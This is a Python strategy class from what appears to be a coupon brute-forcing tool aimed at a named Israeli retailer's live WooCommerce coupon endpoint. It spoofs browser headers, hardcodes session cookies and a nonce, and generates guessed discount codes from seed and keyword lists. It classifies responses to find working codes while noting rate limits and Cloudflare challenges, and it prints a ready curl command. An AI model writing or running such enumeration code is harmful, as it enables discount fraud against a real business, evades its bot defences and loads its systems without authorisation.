import re
from models import TriageStatus
from strategies.base import BaseRetailerStrategy, clean_html, LI_REGEX


class SpringStrategy(BaseRetailerStrategy):
    """Strategy implementation for Spring / Avivs (WooCommerce HTML AJAX endpoint)."""

    @property
    def name(self) -> str:
        return "spring"

    @property
    def display_name(self) -> str:
        return "Spring (Avivs)"

    @property
    def target_url(self) -> str:
        return "https://avivs.co.il/?wc-ajax=apply_coupon"

    @property
    def headers(self) -> dict[str, str]:
        return {
            "accept": "text/html, */*; q=0.01",
            "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://avivs.co.il",
            "priority": "u=1, i",
            "referer": "https://avivs.co.il/checkout/",
            "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/152.0.0.0 Safari/537.36"
            ),
            "x-requested-with": "XMLHttpRequest",
        }

    @property
    def default_cookies(self) -> dict[str, str]:
        return {
            "woocommerce_items_in_cart": "1",
            "woocommerce_cart_hash": "10f6f5ed8162ca09a2f764d982cbda78",
            "wp_woocommerce_session_4f675dc2cb2242bc3896138ca9645870": (
                "t_06641524074419f1ec6a8d64468680|1788895328|1788808928|fc944443f352ee8324e858ef269e12e2"
            ),
        }

    @property
    def default_nonce(self) -> str:
        return "06b1d4b13f"

    @property
    def baseline_candidates(self) -> list[str]:
        # spring10 is a known expired code (confirms parsing); dasd is confirmed invalid
        return ["spring10", "dasd"]

    def build_payload(self, coupon: str, nonce: str) -> dict[str, str]:
        return {
            "security": nonce,
            "coupon_code": coupon,
            "billing_email": "",
        }

    def triage_response(self, text: str, status_code: int) -> tuple[bool, str, str]:
        if status_code == 429:
            return False, TriageStatus.RATE_LIMITED, "HTTP 429 Too Many Requests (Rate limit hit)"

        if status_code == 403:
            if text.strip() == "-1":
                return False, TriageStatus.EXPIRED_NONCE, "Security nonce or session cookie expired (HTTP 403 / -1)"
            if "cf-mitigated" in text or "challenge-running" in text or "Cloudflare" in text or "Just a moment" in text:
                return False, TriageStatus.WAF_CHALLENGE, "Cloudflare WAF challenge triggered"
            return False, TriageStatus.EXPIRED_NONCE, f"HTTP 403 Forbidden: {text[:80]}"

        if "woocommerce-message" in text:
            match = re.search(r'class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', text, re.DOTALL)
            msg = clean_html(match.group(1)) if match else "קוד הקופון הוחל בהצלחה."
            return True, TriageStatus.APPLIED, msg

        if "woocommerce-error" in text:
            li_match = LI_REGEX.search(text)
            raw_msg = li_match.group(1) if li_match else text
            msg = clean_html(raw_msg)

            if any(kw in msg for kw in ["לא קיים", "אינו קיים", "לא תקין"]) or "does not exist" in msg.lower():
                return False, TriageStatus.INVALID, msg

            if any(kw in msg for kw in ["כבר הוחל", "כבר נוסף"]) or "already applied" in msg.lower():
                return True, TriageStatus.ALREADY_APPLIED, msg

            return True, TriageStatus.RESTRICTED, f"Exists (conditional): {msg}"

        return False, TriageStatus.INVALID, f"Unknown response ({status_code}): {clean_html(text[:100])}"

    def get_brand_tokens(self) -> tuple[list[str], list[str]]:
        # Both spring and avivs tokens
        brand_en = ["spring", "springs", "aviv", "avivs"]
        brand_he = ["ספרינג", "אביב", "אביבס"]
        return brand_en, brand_he

    def get_dedicated_seeds(self) -> list[str]:
        return [
            "spring10", "spring5", "spring15", "spring20", "spring50",
            "aviv10", "aviv5", "aviv15", "aviv20", "aviv50",
            "welcome5", "welcome10", "welcome15", "welcome20",
            "new30", "new10", "new20", "vip", "vip10", "club", "club10",
            "first10", "first15", "ספרינג10", "ספרינג5", "אביב10", "אביב5"
        ]

    def get_niche_keywords(self) -> list[str]:
        # Israeli fashion, shoes, bags, accessories, women's watches
        return [
            "shoes", "bags", "fashion", "boots", "sneakers", "sandals", "heels", "watch",
            "נעליים", "תיקים", "אופנה", "מגפיים", "סנדלים", "עקבים", "שעון", "אביב"
        ]

    def get_curl_poc(self, coupon: str, nonce: str) -> str:
        return f"curl -s -X POST '{self.target_url}' -d 'security={nonce}&coupon_code={coupon}&billing_email='"
